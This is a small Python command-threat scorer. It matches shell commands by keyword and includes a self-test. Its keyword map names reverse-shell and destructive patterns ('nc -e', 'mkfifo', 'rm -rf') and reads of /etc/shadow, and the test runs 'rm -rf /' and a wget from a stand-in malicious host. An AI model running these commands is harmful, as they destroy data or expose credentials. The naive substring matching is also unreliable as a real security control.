def calculate_threat_score(command: str):
    """
    Analyzes the command and returns a score (0-100) and a severity label.
    """
    command = command.lower().strip()
    
    # Define our "Danger Zones"
    threat_map = {
        # CRITICAL: Direct system destruction or backdoors
        "rm -rf": (95, "CRITICAL"),
        "chmod 777": (90, "CRITICAL"),
        "mkfifo": (85, "CRITICAL"),
        "nc -e": (98, "CRITICAL"), # Reverse shell
        
        # HIGH: Reconnaissance or downloading tools
        "wget": (70, "HIGH"),
        "curl": (70, "HIGH"),
        "git clone": (75, "HIGH"),
        "apt install": (80, "HIGH"),
        "nmap": (85, "HIGH"),
        
        # MEDIUM: Looking at sensitive files
        "cat /etc/shadow": (60, "MEDIUM"),
        "cat /etc/passwd": (50, "MEDIUM"),
        "crontab -l": (45, "MEDIUM"),
        "history": (40, "MEDIUM"),
        
        # LOW: Standard navigation
        "ls": (5, "LOW"),
        "pwd": (5, "LOW"),
        "whoami": (10, "LOW"),
        "cd": (5, "LOW")
    }

    # Check for keywords in the command
    for keyword, (score, severity) in threat_map.items():
        if keyword in command:
            return score, severity

    # Default for unknown commands
    return 15, "LOW"

# Quick test
if __name__ == "__main__":
    test_commands = ["ls -la", "rm -rf /", "wget http://malicious.com/virus.sh"]
    for cmd in test_commands:
        score, sev = calculate_threat_score(cmd)
        print(f"CMD: {cmd} | Score: {score} | Severity: {sev}")